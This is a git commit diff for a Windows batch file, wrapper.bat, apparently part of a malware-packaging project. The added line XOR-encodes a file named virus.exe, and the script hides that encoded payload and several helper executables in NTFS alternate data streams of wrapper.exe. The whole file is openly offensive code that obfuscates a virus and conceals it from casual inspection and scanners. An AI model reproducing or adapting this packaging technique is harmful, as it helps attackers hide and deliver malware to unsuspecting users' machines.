9a2d0d5c13224f881a3ea620cc14f8ac1e2ebd36
narasimha14 <narasimha.appdev@gmail.com>
2016-10-31 13:31:18 -0400

    Adding batch file

--- wrapper.bat
+++ wrapper.bat
@@ -1,4 +1,5 @@
+xorcipher.exe virus.exe tmp_virus.exe wrapper.exe
 type CS.exe > wrapper.exe:CS.exe
 type streams.exe > wrapper.exe:streams.exe
 type xorcipher.exe > wrapper.exe:xorcipher.exe
-type virus.exe > wrapper.exe:virus.exe
+type tmp_virus.exe > wrapper.exe:virus.exe
